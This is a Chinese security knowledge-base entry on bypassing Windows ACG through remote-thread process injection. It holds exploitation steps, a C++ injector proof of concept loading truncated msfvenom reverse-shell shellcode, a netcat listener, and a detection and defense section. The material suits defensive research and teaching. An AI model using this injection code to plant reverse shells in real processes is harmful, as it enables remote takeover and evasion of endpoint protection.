---
id: windows-acg-bypass-remote-code-injection-virtualallocex
title: ACG（Dynamic code prohibited）进程对远程 VirtualAllocEx+WriteProcessMemory 代码注入不设防，DLL 注入被拦
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: 远程线程代码注入绕过进程缓解策略 ACG
aliases:
- ACG 绕过
- Arbitrary Code Guard bypass
- ProcessDynamicCodePolicy 远程代码注入
tags:
- windows
- acg
- mitigation-bypass
- process-injection
- shellcode
- edr
severity: high
confidence: high
status: draft
created: '2026-11-08'
updated: '2026-11-08'
---

# 一句话结论

通过 `SetProcessMitigationPolicy(ProcessDynamicCodePolicy)` 开启 ACG 的进程能阻止自身分配 RWX 内存与加载执行动态代码（DLL 注入直接失败、进程退出），但**不能**阻止其他进程用 `OpenProcess` + `VirtualAllocEx`（PAGE_EXECUTE_READWRITE）+ `WriteProcessMemory` + `CreateRemoteThread` 注入事先生成的 shellcode 并执行，已验证 msfvenom reverse shell 成功回连。

# 原理

- ACG 是进程级缓解策略：内核内存管理器强制该进程的代码页不可变、不允许创建新的未签名可执行页——进程内部调用 `VirtualAlloc` 分配 RWX、`VirtualProtect` 改写已映射代码页、以及 `LoadLibrary` 加载并执行 DLL 内新代码，都会被拦截（DLL 注入测试中线程立即退出、进程关闭，CS stager 请求完即被杀，无法上线）。
- 但 ACG 只约束**目标进程自身**的动态代码行为，不限制外部进程持有句柄后的远程操作：注入器在自身进程内准备好 shellcode（机器码不需目标进程生成任何动态代码），`VirtualAllocEx` 经目标进程句柄在目标地址空间分配 RWX 内存、`WriteProcessMemory` 写入、`CreateRemoteThread` 以远程线程执行——整条链上目标进程没有"创建/修改代码页"的自主动作，ACG 不生效。
- CS/MSF 分阶段 stager 的差异验证了机制：CS payload 需要在目标内请求并处理 stage（涉及动态代码操作），在 ACG 进程中失败；而 msfvenom 单阶段 `windows/x64/shell_reverse_tcp` 纯机器码直执行，成功拿到 shell。

# 触发条件

- 攻击者对启用 ACG 的进程拥有同等或更高权限的进程句柄（OpenProcess PROCESS_ALL_ACCESS）。
- 注入载荷为完整独立的 shellcode（无需在目标进程中二次解码/生成代码）；分阶段框架（CS）默认 payload 会失败。

# 利用步骤

1. 用 Process Hacker 确认目标进程 Mitigation policies 含 Dynamic code prohibited。
2. 常规 DLL 注入（LoadLibrary）失败：进程退出，无法上线。
3. 注入器获取目标 PID（枚举进程或镜像列表），`OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)`。
4. `VirtualAllocEx(..., MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)` → `WriteProcessMemory` 写入 shellcode → `CreateRemoteThread` 执行。
5. 监听端收取回连 shell（nc -lvvp 684）。

# PoC

```cpp
// Inject_msf.exe <PID>；shellcode 为 msfvenom -p windows/x64/shell_reverse_tcp
unsigned char shellcode[] = "\xfc\x48...";
HANDLE processHandle, remoteThread;
PVOID remoteBuffer;
processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode,
                              (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
remoteThread = CreateRemoteThread(processHandle, NULL, 0,
                                  (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
CloseHandle(processHandle);
```

实测：ACG 开启的 TestPolicy1.exe 中注入后 `nc -lvvp 684` 收到 Microsoft Windows 反弹 shell（whoami 返回 erichas\administrator）。

# 变体与关联

- 反之：ACG 能有效对抗把 hook DLL 注入用户进程的 EDR——被注入的 EDR DLL 在 ACG 进程内无法执行其动态代码逻辑。
- 观察到 Sangfor SangforTcpX64.dll 在 ACG 开启的进程中仍被成功加载（仅当进程发起 TCP 连接时注入，疑似内核级/更高权限注入），说明内核驱动可无视用户态 ACG。
- 再叠加 ProcessSignaturePolicy（MicrosoftSignedOnly，即 CIG/签名限制）：未签名 DLL（如 sxf）加载被直接阻止（报 0xc0000428），注入微软签名 DLL 可执行，但该进程内网络请求亦失败；签名限制对所有进程内动态代码与第三方 DLL 均更严格。
- 衍生细节：被注入进程手动关闭后 shell 仍存活，因为父进程 cmd.exe 未退出、shellcode 线程仍运行。

# 检测与防御

- 检测：监控跨进程 `OpenProcess(PROCESS_ALL_ACCESS)` + `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` 调用序列（ETW/Sysmon Event 8、10）；Process Monitor 观察 Thread Create 与远程分配。
- 防御：ACG 需配合对句柄获取的限制（如 ProcessSignaturePolicy、受保护的 PPL 进程、限制 SeDebugPrivilege）；对高危进程启用 RUNTIME_PROTECTION/反注入；不要依赖 ACG 单独防御注入。
